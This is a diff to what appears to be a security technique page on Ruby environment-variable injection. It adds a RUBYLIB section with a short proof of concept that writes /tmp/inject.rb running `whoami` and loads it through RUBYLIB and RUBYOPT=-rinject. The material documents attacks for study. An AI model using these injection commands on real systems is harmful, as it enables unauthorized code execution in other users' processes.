@@ -37,6 +37,15 @@ An option written after `hello.rb` is passed to the script in `ARGV`; it does no
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
 
+## RUBYLIB
+
+Instead of prepending the load directory with `-I` inside `RUBYOPT`, the separate `RUBYLIB` environment variable adds directories to Ruby's `$LOAD_PATH`. Combined with `RUBYOPT=-r<module>` it loads attacker code without needing `-I` in `RUBYOPT`:<sup>[[1]](#references)</sup>
+
+```bash
+echo "puts \`whoami\`" > /tmp/inject.rb
+RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
+```
+
 ## References
 
 - [1] [Ruby documentation - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
